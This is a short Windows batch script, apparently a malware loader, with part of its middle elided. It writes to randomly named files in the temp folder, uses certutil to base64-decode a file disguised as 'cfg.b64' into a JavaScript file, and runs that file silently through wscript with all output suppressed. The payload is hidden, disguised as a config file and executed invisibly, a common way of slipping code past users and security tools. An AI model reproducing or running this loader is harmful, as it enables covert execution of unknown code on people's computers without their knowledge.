@echo off
setlocal
set "OUT=%TEMP%\rbc_11ff2a7d815a22e0.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_11ff2a7d815a22e0.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_11ff2a7d815a22e0.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_11ff2a7d815a22e0.js"
exit /b 0
